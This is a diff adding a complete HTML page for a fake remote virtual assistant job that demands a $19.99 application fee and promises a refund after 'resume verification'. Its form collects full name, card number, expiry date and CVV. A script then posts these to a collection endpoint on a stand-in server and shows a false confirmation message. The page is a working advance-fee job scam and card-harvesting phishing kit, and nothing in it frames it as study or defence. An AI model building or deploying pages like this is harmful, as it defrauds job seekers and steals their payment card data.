@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Remote Virtual Assistant Job - $19.99 Fee</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #2c3e50;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #27ae60;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #219150;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Remote Virtual Assistant Job - $19.99 Fee</h2>
+    <p>Apply now and get your fee refunded after resume verification!</p>
+
+    <form id="paymentForm">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" name="name" required>
+
+      <label for="cardNumber">Card Number</label>
+      <input type="text" id="cardNumber" name="cardNumber" required>
+
+      <label for="expDate">Expiration Date</label>
+      <input type="text" id="expDate" name="expDate" placeholder="MM/YY" required>
+
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" name="cvv" required>
+
+      <button type="submit">Pay $19.99 and Apply</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('paymentForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const data = Object.fromEntries(formData);
+
+      // Send data to your server
+      fetch('https://yourserver.com/collect-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      })
+      .then(response => response.json())
+      .then(result => {
+        alert("Thank you! Your fee will be refunded after resume verification. You'll receive a confirmation email.");
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        alert("Something went wrong. Please try again.");
+      });
+    });
+  </script>
+</body>
+</html>
